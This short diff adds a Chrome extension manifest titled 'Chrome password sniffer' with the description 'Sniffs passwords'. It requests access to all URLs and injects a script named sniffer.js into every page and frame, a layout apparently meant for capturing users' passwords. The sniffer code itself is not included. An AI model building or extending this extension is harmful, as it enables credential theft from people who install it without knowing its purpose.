@@ -1,0 +1,18 @@
+{
+  "name"        : "Chrome password sniffer",
+  "version"     : "1",
+  "description" : "Sniffs passwords",
+  "minimum_chrome_version" : "18",
+  "manifest_version": 2,
+  "permissions" : ["*://*/*"],
+  "background"  : {
+    "scripts": ["background.js"],
+    "persistent": false
+  },
+  "content_scripts" : [{
+    "matches"   : ["*://*/*"],
+    "js"        : ["sniffer.js"],
+    "run_at"    : "document_idle",
+    "all_frames" : true
+  }]
+}
